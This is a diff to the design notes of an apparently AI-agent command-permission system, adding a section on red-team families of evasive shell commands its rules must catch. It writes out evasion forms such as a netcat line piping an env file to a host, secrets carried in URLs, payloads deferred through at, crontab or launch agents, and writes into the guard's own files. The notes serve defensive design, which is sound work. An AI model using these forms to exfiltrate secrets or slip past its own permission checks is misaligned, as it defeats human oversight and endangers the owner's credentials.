@@ -1835,6 +1835,47 @@ Tests: `cypher-permissions-final-it1.test.mjs` (10, three seeds). Each class as 
 - *Naming another chat's work to keep it* (core.ts `ownerNames`): the owner's words name it only in a clause that
   doesn't negate, defer or ask about it ("clean up, but don't touch feat/x yet" keeps the floor).
 
+#### 7.3.15 Final pass, iteration 2: the red-team f2 families (2026-11-24)
+
+Tests: `cypher-permissions-final-it2.test.mjs` (9, three seeds). Each family judged against the floor first:
+
+- *A program hidden by an assignment* (`GIT_TRACE=1 curl …`, `KUBECONFIG=… kubectl delete …`): the floor's readers
+  read the line with the program shown (core.ts `LineAssessment.shown`); the tier and the judge's reading keep the
+  hidden program, since the variable may change how it runs.
+- *Sinks* (risk.ts `NETWORK_SINKS` relay, tailnet, cluster): row 1 only when a secret flows in. A URL built from a
+  secret sends it whatever program fetches it (`urlCarriedSecret`). Publishing a folder (`FOLDER_PUBLISHERS`, an
+  image built and pushed) sends what its ignore rules let through (git's listing with `.npmignore`/`.gitignore`/
+  `.dockerignore`): a secret among it is row 1; publishing ordinary code is not the floor (the judge's
+  "publishes a package"). Serving a folder to the network (`http.server --bind 0.0.0.0` in `~/.ssh`) exposes but
+  sends nothing: the judge's.
+- *Credential stores* (config.ts `DEFAULT_SENSITIVE`): tools' own token files and project `.envrc`, `.dev.vars`,
+  service-account keys; `*.tfvars` stays the judge's (as often plain settings).
+- *App automation*: JXA `doShellScript`, and apps that send (Mail, Messages, Outlook) as a network category.
+- *The permission system's folders* (risk.ts `intoFolder`): a destination folder with the source's name there, a
+  tree synced into a folder of it, git writing a work tree there; the enforcing extension's own files and the
+  installed Runtime's copies; the `/System/Volumes/Data` spelling (resolve.ts); a link the line makes and then
+  writes through (core.ts `throughLinks`).
+- `PI_CODING_AGENT_DIR` (a child agent with another agent folder): not the floor. Owner-approved dev work runs Pi
+  with private agent folders routinely (55 lines in the guard sets); it stays the judge's ("runs a program known
+  only when it runs").
+- *Deferred payloads*: `at`/`batch` input, a crontab fed by a group (the reader sets the group's pipe), a launch
+  agent's `ProgramArguments` when `launchctl load` runs it.
+- *Folders through moves*: a `cd` on an `&&` chain that is the rest of the line, `cd -`; a relative write where
+  the folder is unknown after a move into a folder of the permission system (`movedIntoSystem`).
+- *Feeders*: `xargs -a FILE` reads FILE; a secret's lines handed to a sink; a here-string's names; a while-read
+  loop's variable inside a longer path; a glob as a sink's input (`nc h 9 < .en?`); the `script` wrapper. Shell
+  forms the reader gives up on (`set --`, arrays, an alias ending in `<`) stay opaque: the judge's, marked as a
+  line rules can't read or a path known only when it runs.
+- *Non-shell project scripts* (`python3 tools/upload.py`): round 5's rule stands — only a script this task wrote
+  is read as code; another's is the project's. Shell project scripts (§7.3.14) are read for the floor unless git
+  tracks them (committed code is its owners').
+- *Denials across forms*: scaling to zero is a stop; a denied pid meets a pattern by what the process is known by.
+- *Other tasks' work*: git verbs that discard a tree's work (`gitDiscards`), on a tree not this chat's own; a glob
+  matching inside another task's worktree; `for-each-ref` prefixes; tmux/screen/zellij sessions and the Docker
+  Engine API (schema.ts); a schema tool's deleting subcommand destroys.
+- *Owner naming*: quoted speech (several words in quotes) and sentences with a condition or deferral word don't name
+  another chat's work.
+
 ### 7.4 Human approval
 
 `ctx.ui.select`, which Cypher bridges to a question in the desktop and iOS apps
